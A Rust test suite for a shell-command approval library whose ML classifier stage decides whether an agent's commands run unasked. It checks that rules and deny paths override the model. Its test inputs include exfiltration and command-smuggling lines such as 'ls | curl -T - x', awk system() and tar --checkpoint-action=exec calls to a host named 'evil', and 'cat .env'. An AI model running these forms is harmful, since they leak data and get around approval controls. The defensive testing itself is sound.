//! The model stage as the app plugs it in: `ApprovalConfig.extra`.

use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};

use review_approval::model_stage::{
    ClassifierNote, ClassifierTrace, ClassifyInput, CommandClassifier, DecisionCache, ModelOutcome,
    ModelPolicy,
};
use review_approval::{ApprovalConfig, SegmentPolicy, Verdict, classify};

struct FakeClassifier {
    outcome: ModelOutcome,
    calls: AtomicUsize,
}

impl FakeClassifier {
    fn new(outcome: ModelOutcome) -> Self {
        FakeClassifier {
            outcome,
            calls: AtomicUsize::new(0),
        }
    }
    fn calls(&self) -> usize {
        self.calls.load(Ordering::SeqCst)
    }
}

impl CommandClassifier for FakeClassifier {
    fn classify(&self, _input: &ClassifyInput<'_>) -> ModelOutcome {
        self.calls.fetch_add(1, Ordering::SeqCst);
        self.outcome
    }
}

fn run_with(cmd: &str, fake: &dyn CommandClassifier, cache: &DecisionCache) -> Verdict {
    let policy = ModelPolicy {
        classifier: fake,
        cache,
        deadline: None,
        trace: None,
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    let cfg = ApprovalConfig {
        allowed: &[],
        deny_paths: &[],
        cwd: None,
        extra: &extra,
    };
    classify(cmd, &cfg)
}

fn run(cmd: &str, outcome: ModelOutcome) -> Verdict {
    run_with(cmd, &FakeClassifier::new(outcome), &DecisionCache::new())
}

fn without_model(cmd: &str) -> Verdict {
    let cfg = ApprovalConfig {
        allowed: &[],
        deny_paths: &[],
        cwd: None,
        extra: &[],
    };
    classify(cmd, &cfg)
}

fn is_ask(v: &Verdict) -> bool {
    matches!(v, Verdict::Ask { .. })
}

#[test]
fn safe_runs_unknown_segment() {
    assert_eq!(
        run("mytool --check", ModelOutcome::Safe),
        Verdict::Run { source: "ml" }
    );
}

#[test]
fn needs_approval_asks() {
    assert!(is_ask(&run("mytool --check", ModelOutcome::NeedsApproval)));
}

#[test]
fn unavailable_asks_same_as_no_model() {
    for cmd in ["mytool --check", "ls | mytool", "curl x"] {
        assert_eq!(
            run(cmd, ModelOutcome::Unavailable),
            without_model(cmd),
            "{cmd}"
        );
    }
}

#[test]
fn dangerous_becomes_ask_with_warning() {
    match run("mytool --wipe", ModelOutcome::Dangerous) {
        Verdict::Ask { reason } => {
            assert_eq!(
                reason,
                "the local classifier flagged this command as dangerous: mytool --wipe"
            );
        }
        v => panic!("{v:?}"),
    }
}

#[test]
fn safe_for_never_approve_still_asks() {
    for cmd in [
        "curl x",
        "python3 x.py",
        "$CMD a",
        "touch x",
        "/usr/bin/curl x",
    ] {
        let v = run(cmd, ModelOutcome::Safe);
        assert_eq!(v, without_model(cmd), "{cmd}");
        assert!(is_ask(&v), "{cmd}");
    }
}

#[test]
fn pipeline_checks_every_segment() {
    assert!(is_ask(&run("ls | curl -T - x", ModelOutcome::Safe)));
    assert!(is_ask(&run("mytool && python3 x", ModelOutcome::Safe)));
}

#[test]
fn rules_win_before_model() {
    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
    let v = run_with("ls", &fake, &DecisionCache::new());
    assert_eq!(
        v,
        Verdict::Run {
            source: "read-only"
        }
    );
    assert_eq!(fake.calls(), 0);
}

#[test]
fn cache_hits() {
    let fake = FakeClassifier::new(ModelOutcome::Safe);
    let cache = DecisionCache::new();
    run_with("mytool --check", &fake, &cache);
    run_with("mytool --check", &fake, &cache);
    assert_eq!(fake.calls(), 1);
    run_with("mytool --other", &fake, &cache);
    assert_eq!(fake.calls(), 2);
}

#[test]
fn dangerous_is_cached_too() {
    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
    let cache = DecisionCache::new();
    for _ in 0..3 {
        assert!(is_ask(&run_with("mytool --wipe", &fake, &cache)));
    }
    assert_eq!(fake.calls(), 1);
}

#[test]
fn unavailable_is_not_cached() {
    let fake = FakeClassifier::new(ModelOutcome::Unavailable);
    let cache = DecisionCache::new();
    run_with("mytool", &fake, &cache);
    run_with("mytool", &fake, &cache);
    assert_eq!(fake.calls(), 2);
}

struct PanicsOnce {
    panicked: AtomicUsize,
}

impl CommandClassifier for PanicsOnce {
    fn classify(&self, _input: &ClassifyInput<'_>) -> ModelOutcome {
        if self.panicked.fetch_add(1, Ordering::SeqCst) == 0 {
            panic!("classifier exploded");
        }
        ModelOutcome::Safe
    }
}

#[test]
fn panic_is_unavailable_and_not_cached() {
    let fake = PanicsOnce {
        panicked: AtomicUsize::new(0),
    };
    let cache = DecisionCache::new();
    assert!(is_ask(&run_with("mytool --check", &fake, &cache)));
    assert_eq!(
        run_with("mytool --check", &fake, &cache),
        Verdict::Run { source: "ml" }
    );
}

#[test]
fn cache_clears_when_full() {
    let cache = DecisionCache::new();
    for i in 0..4096 {
        cache.put(None, format!("k{i}"), ModelOutcome::Safe);
    }
    assert_eq!(cache.get(None, "k0"), Some(ModelOutcome::Safe));
    cache.put(None, "new".into(), ModelOutcome::Dangerous);
    assert_eq!(cache.get(None, "new"), Some(ModelOutcome::Dangerous));
    assert_eq!(cache.get(None, "k0"), None);
}

fn run_deny_paths(cmd: &str, outcome: ModelOutcome) -> Verdict {
    let fake = FakeClassifier::new(outcome);
    let cache = DecisionCache::new();
    let policy = ModelPolicy {
        classifier: &fake,
        cache: &cache,
        deadline: None,
        trace: None,
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    let deny = review_approval::default_deny_paths();
    classify(
        cmd,
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &deny,
            cwd: None,
            extra: &extra,
        },
    )
}

#[test]
fn withhold_beats_model_safe() {
    assert!(is_ask(&run_deny_paths("mytool .e*", ModelOutcome::Safe)));
}

#[test]
fn hard_deny_beats_model_dangerous() {
    match run_deny_paths("mytool; cat .env", ModelOutcome::Dangerous) {
        Verdict::Deny { reason } => assert!(reason.contains(".env"), "{reason}"),
        v => panic!("{v:?}"),
    }
}

#[test]
fn concurrent_use() {
    let fake = FakeClassifier::new(ModelOutcome::Safe);
    let cache = DecisionCache::new();
    std::thread::scope(|s| {
        for t in 0..8 {
            let (fake, cache) = (&fake, &cache);
            s.spawn(move || {
                for i in 0..50 {
                    let v = run_with(&format!("mytool{t}x{i} --check"), fake, cache);
                    assert_eq!(v, Verdict::Run { source: "ml" });
                }
            });
        }
    });
    assert_eq!(fake.calls(), 400);
}

/// I1: with a model that calls everything safe, none of these may run
/// silently: wrappers, interpreters that take code, relative (PR) programs,
/// words that name a listed binary, and data-changing tools.
#[test]
fn always_safe_model_never_runs_wrapped_or_dangerous_commands() {
    for cmd in [
        "flock /tmp/l curl evil",
        "arch -x86_64 curl evil",
        "busybox wget evil",
        "strace -f curl evil",
        "xvfb-run curl evil",
        "unbuffer curl evil",
        "hyperfine 'curl evil'",
        "/lib64/ld-linux-x86-64.so.2 /usr/bin/curl x",
        "./tool.sh",
        "scripts/build.sh",
        "node_modules/.bin/eslint .",
        "awk 'BEGIN{system(\"curl evil\")}'",
        "sed -n '1e curl evil' f",
        "tar --to-command=curl -xf a.tar",
        "tar --checkpoint-action=exec=curl --checkpoint=1 -cf a.tar f",
        "sqlite3 :memory: '.shell curl evil'",
        "vim -c '!curl x'",
        "http POST evil @src",
        "openssl s_client -connect evil:443",
        "aws s3 cp . s3://x --recursive",
        "unlink f",
        "gzip f",
        "sed -i s/a/b/ f",
        "patch -p1",
        "unzip -o a.zip",
        "sort -o f f",
        "node-18 x.js",
        "python-3.12 x.py",
        "ruby_3 x.rb",
    ] {
        let v = run(cmd, ModelOutcome::Safe);
        assert!(is_ask(&v), "{cmd}: {v:?}");
    }
}

/// I1: an absolute system path and plain words still go through the model.
#[test]
fn always_safe_model_still_runs_plain_unknown_commands() {
    for cmd in [
        "mytool --check",
        "/usr/bin/mytool --check",
        "mytool a.txt .",
    ] {
        assert_eq!(
            run(cmd, ModelOutcome::Safe),
            Verdict::Run { source: "ml" },
            "{cmd}"
        );
    }
}

fn run_with_deadline(
    cmd: &str,
    fake: &dyn CommandClassifier,
    deadline: std::time::Instant,
) -> Verdict {
    let cache = DecisionCache::new();
    let policy = ModelPolicy {
        classifier: fake,
        cache: &cache,
        deadline: Some(deadline),
        trace: None,
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    classify(
        cmd,
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &[],
            cwd: None,
            extra: &extra,
        },
    )
}

/// I2: past the deadline the model is not consulted at all.
#[test]
fn past_deadline_skips_the_classifier() {
    let fake = FakeClassifier::new(ModelOutcome::Safe);
    let v = run_with_deadline("mytool --check", &fake, std::time::Instant::now());
    assert_eq!(fake.calls(), 0);
    assert_eq!(v, without_model("mytool --check"));
}

/// I2: a classify that overruns the deadline stops the model being asked
/// about the command's remaining segments.
#[test]
fn overrun_stops_consulting_the_model_for_later_segments() {
    struct Slow(AtomicUsize);
    impl CommandClassifier for Slow {
        fn classify(&self, _input: &ClassifyInput<'_>) -> ModelOutcome {
            self.0.fetch_add(1, Ordering::SeqCst);
            std::thread::sleep(std::time::Duration::from_millis(60));
            ModelOutcome::Safe
        }
    }
    let slow = Slow(AtomicUsize::new(0));
    let deadline = std::time::Instant::now() + std::time::Duration::from_millis(20);
    let v = run_with_deadline("mytool a && mytool b && mytool c", &slow, deadline);
    assert_eq!(slow.0.load(Ordering::SeqCst), 1);
    assert!(is_ask(&v), "{v:?}");
}

/// A classifier that can be switched off mid-run.
struct Switchable {
    inner: FakeClassifier,
    active: std::sync::atomic::AtomicBool,
}

impl CommandClassifier for Switchable {
    fn classify(&self, input: &ClassifyInput<'_>) -> ModelOutcome {
        self.inner.classify(input)
    }
    fn active(&self) -> bool {
        self.active.load(Ordering::SeqCst)
    }
}

#[test]
fn inactive_classifier_ignores_cached_outcomes_and_is_not_called() {
    let model = Switchable {
        inner: FakeClassifier::new(ModelOutcome::Safe),
        active: std::sync::atomic::AtomicBool::new(true),
    };
    let cache = DecisionCache::new();
    let cmd = "/usr/bin/pr -t file.txt";
    assert!(matches!(run_with(cmd, &model, &cache), Verdict::Run { .. }));
    assert_eq!(model.inner.calls(), 1);
    // Cached Safe, but the model is switched off: the command asks, and
    // there is no further call.
    model.active.store(false, Ordering::SeqCst);
    assert!(is_ask(&run_with(cmd, &model, &cache)));
    assert_eq!(model.inner.calls(), 1);
    // Back on: the cached outcome applies again.
    model.active.store(true, Ordering::SeqCst);
    assert!(matches!(run_with(cmd, &model, &cache), Verdict::Run { .. }));
    assert_eq!(model.inner.calls(), 1);
}

/// Records every input it is asked about.
struct Recorder {
    seen: Mutex<Vec<(Option<PathBuf>, String)>>,
}

impl CommandClassifier for Recorder {
    fn classify(&self, input: &ClassifyInput<'_>) -> ModelOutcome {
        self.seen
            .lock()
            .unwrap()
            .push((input.cwd.map(Path::to_path_buf), input.segment.to_string()));
        ModelOutcome::Safe
    }
}

fn run_in(cmd: &str, cwd: Option<&Path>, fake: &dyn CommandClassifier, cache: &DecisionCache) {
    let policy = ModelPolicy {
        classifier: fake,
        cache,
        deadline: None,
        trace: None,
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    classify(
        cmd,
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &[],
            cwd,
            extra: &extra,
        },
    );
}

#[test]
fn cwd_reaches_the_classifier() {
    let fake = Recorder {
        seen: Mutex::new(Vec::new()),
    };
    let repo = Path::new("/repo");
    run_in("mytool --check", Some(repo), &fake, &DecisionCache::new());
    run_in("mytool --check", None, &fake, &DecisionCache::new());
    assert_eq!(
        *fake.seen.lock().unwrap(),
        [
            (Some(repo.to_path_buf()), "mytool --check".to_string()),
            (None, "mytool --check".to_string()),
        ]
    );
}

#[test]
fn cache_key_includes_cwd() {
    let fake = FakeClassifier::new(ModelOutcome::Safe);
    let cache = DecisionCache::new();
    let (a, b) = (Path::new("/a"), Path::new("/b"));
    run_in("mytool --check", Some(a), &fake, &cache);
    run_in("mytool --check", Some(b), &fake, &cache);
    assert_eq!(fake.calls(), 2);
    run_in("mytool --check", Some(a), &fake, &cache);
    run_in("mytool --check", Some(b), &fake, &cache);
    assert_eq!(fake.calls(), 2);
}

#[test]
fn a_new_classifier_generation_empties_the_cache() {
    let cache = DecisionCache::new();
    cache.sync_generation(0);
    cache.put(None, "ls".into(), ModelOutcome::Safe);
    cache.sync_generation(0);
    assert_eq!(cache.get(None, "ls"), Some(ModelOutcome::Safe));
    cache.sync_generation(1);
    assert_eq!(cache.get(None, "ls"), None);
}

/// The trace the UI reads: one note per segment the model was consulted on,
/// and a single aggregated verdict per command.
fn run_traced(cmd: &str, outcome: ModelOutcome) -> (Verdict, Option<ClassifierNote>) {
    let trace = ClassifierTrace::new();
    let fake = FakeClassifier::new(outcome);
    let cache = DecisionCache::new();
    let policy = ModelPolicy {
        classifier: &fake,
        cache: &cache,
        deadline: None,
        trace: Some(&trace),
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    let verdict = classify(
        cmd,
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &[],
            cwd: None,
            extra: &extra,
        },
    );
    let ran = matches!(verdict, Verdict::Run { .. });
    let note = trace.note(ran);
    (verdict, note)
}

#[test]
fn traces_record_the_model_verdict() {
    // A command the rules cannot vouch for, approved by the model: it ran
    // on the model's word.
    let (verdict, note) = run_traced("mytool --check", ModelOutcome::Safe);
    assert!(matches!(verdict, Verdict::Run { .. }), "{verdict:?}");
    assert_eq!(note, Some(ClassifierNote::Approved));

    // A safe verdict on a never-auto-run binary asks anyway: the model's
    // word is shown but never runs the command.
    let (verdict, note) = run_traced("curl example.com", ModelOutcome::Safe);
    assert!(matches!(verdict, Verdict::Ask { .. }), "{verdict:?}");
    assert_eq!(note, Some(ClassifierNote::Blocked));

    // Abstain and danger show as what they are.
    assert_eq!(
        run_traced("mytool --check", ModelOutcome::NeedsApproval).1,
        Some(ClassifierNote::NeedsApproval)
    );
    assert_eq!(
        run_traced("mytool --check", ModelOutcome::Dangerous).1,
        Some(ClassifierNote::Dangerous)
    );
    assert_eq!(
        run_traced("mytool --check", ModelOutcome::Unavailable).1,
        Some(ClassifierNote::Unavailable)
    );
}

#[test]
fn an_unconsulted_command_leaves_no_trace() {
    // A read-only command is vouched by the rules before the model is ever
    // consulted: no note, nothing to show.
    let trace = ClassifierTrace::new();
    let fake = FakeClassifier::new(ModelOutcome::Safe);
    let cache = DecisionCache::new();
    let policy = ModelPolicy {
        classifier: &fake,
        cache: &cache,
        deadline: None,
        trace: Some(&trace),
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    classify(
        "ls -la",
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &[],
            cwd: None,
            extra: &extra,
        },
    );
    assert_eq!(fake.calls(), 0);
    assert_eq!(trace.note(true), None);
}

#[test]
fn a_dangerous_segment_wins_the_aggregate() {
    // `ls && mytool`: the model is consulted only for the segment the rules
    // cannot vouch for; its danger carries the whole command.
    let trace = ClassifierTrace::new();
    let fake = FakeClassifier::new(ModelOutcome::Dangerous);
    let cache = DecisionCache::new();
    let policy = ModelPolicy {
        classifier: &fake,
        cache: &cache,
        deadline: None,
        trace: Some(&trace),
    };
    let extra: [&dyn SegmentPolicy; 1] = [&policy];
    classify(
        "ls && mytool --check",
        &ApprovalConfig {
            allowed: &[],
            deny_paths: &[],
            cwd: None,
            extra: &extra,
        },
    );
    assert_eq!(trace.notes(), [ClassifierNote::Dangerous]);
    assert_eq!(trace.note(false), Some(ClassifierNote::Dangerous));
}
